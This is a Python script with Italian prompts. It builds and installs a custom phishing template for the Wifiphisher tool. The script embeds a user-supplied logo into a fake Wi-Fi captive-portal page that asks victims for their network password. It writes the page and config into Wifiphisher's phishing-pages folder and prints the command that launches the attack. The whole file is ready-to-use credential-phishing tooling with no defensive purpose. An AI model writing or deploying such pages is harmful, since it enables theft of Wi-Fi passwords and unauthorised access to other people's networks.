#!/usr/bin/env python3
import os
import base64
from pathlib import Path
from PIL import Image

def main():
    print("=== Generatore di Template Wifiphisher con logo inline ===")

    # Chiedi nome template
    name = input("Inserisci il nome della nuova pagina phishing (es. wirem): ").strip()
    if not name:
        print("[!] Nome non valido.")
        return

    # Chiedi path logo
    logo_path = input("Inserisci il percorso completo dell'immagine PNG da usare come logo: ").strip()
    if not os.path.isfile(logo_path):
        print(f"[!] Immagine non trovata: {logo_path}")
        return

    # Percorsi
    template_name = name
    base_dir = Path(f"/usr/lib/python3/dist-packages/wifiphisher/data/phishing-pages")
    template_dir = base_dir / template_name
    html_dir = template_dir / "html"
    index_file = html_dir / "index.html"
    config_file = template_dir / "config.ini"

    print(f"[+] Creazione struttura in: {template_dir}")
    html_dir.mkdir(parents=True, exist_ok=True)

    # Converti logo in PNG compatibile
    print("[+] Conversione immagine in PNG...")
    temp_png = "/tmp/logo_temp.png"
    with Image.open(logo_path) as img:
        img.convert("RGB").save(temp_png, format="PNG", optimize=True)

    # Codifica in base64
    print("[+] Codifica Base64 del logo...")
    with open(temp_png, "rb") as f:
        logo_b64 = base64.b64encode(f.read()).decode("utf-8")

    # Genera index.html
    print("[+] Scrittura index.html con logo inline...")
    html = f"""<!doctype html>
<html lang="it">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Connessione Wi‑Fi — {template_name}</title>
<style>
body{{font-family: Arial, Helvetica, sans-serif; background:#f5f7fa; color:#222; margin:0; padding:0;}}
.container{{max-width:420px;margin:6vh auto;background:#fff;padding:24px;border-radius:8px;box-shadow:0 6px 20px rgba(0,0,0,0.08);text-align:center;}}
img.logo{{max-width:220px;height:auto;margin-bottom:12px;}}
h1{{font-size:20px;margin:6px 0 18px;color:#111;}}
p.lead{{font-size:14px;color:#444;margin:0 0 18px;}}
label{{display:block;text-align:left;margin-bottom:6px;font-weight:600;}}
input[type="password"]{{width:100%;padding:10px;border:1px solid #ccd; border-radius:6px;margin-bottom:12px;font-size:15px;}}
.btn{{display:inline-block;width:100%;padding:11px;border-radius:6px;border:0;background:#ff6b00;color:#fff;font-weight:700;font-size:15px;cursor:pointer;}}
.small{{font-size:12px;color:#666;margin-top:12px;}}
footer{{font-size:11px;color:#999;margin-top:14px;}}
</style>
</head>
<body>
<div class="container" role="main" aria-labelledby="title">
    <img src="data:image/png;base64,{logo_b64}" class="logo" alt="logo">
    <h1 id="title">Accesso alla rete</h1>
    <p class="lead">Per continuare la navigazione, inserisci la password della rete.</p>
    <form method="POST" action="">
        <label for="pw">Password Wi‑Fi</label>
        <input id="pw" name="password" type="password" autocomplete="off" required placeholder="Inserisci password">
        <input class="btn" type="submit" value="Connetti">
    </form>
    <p class="small">Se non conosci la password, contatta il supporto tecnico.</p>
    <footer>{template_name} · captive portal</footer>
</div>
</body>
</html>"""
    index_file.write_text(html, encoding="utf-8")

    # Scrivi config.ini nel formato richiesto
    print("[+] Scrittura config.ini compatibile...")
    config = f"""[info]
Name = {template_name} - Accesso WiFi
Description = Template generato automaticamente con logo personalizzato.
[context]
"""
    config_file.write_text(config, encoding="utf-8")

    print(f"[✔] Template '{template_name}' installato correttamente!")
    print(f"    Avvia con: sudo wifiphisher -p {template_name}")

if __name__ == "__main__":
    main()
